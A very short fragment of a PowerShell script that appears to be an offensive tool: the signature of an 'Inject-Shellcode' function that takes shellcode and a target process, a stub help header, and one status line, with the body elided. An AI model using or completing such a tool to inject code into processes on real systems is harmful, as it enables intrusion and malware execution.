function Inject-Shellcode ([switch]$x86, [switch]$x64, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath, $ProcessName)
{
<#
.SYNOPSIS
Inject-Shellcode
...
echo "Running against process ID: " $Process.ID
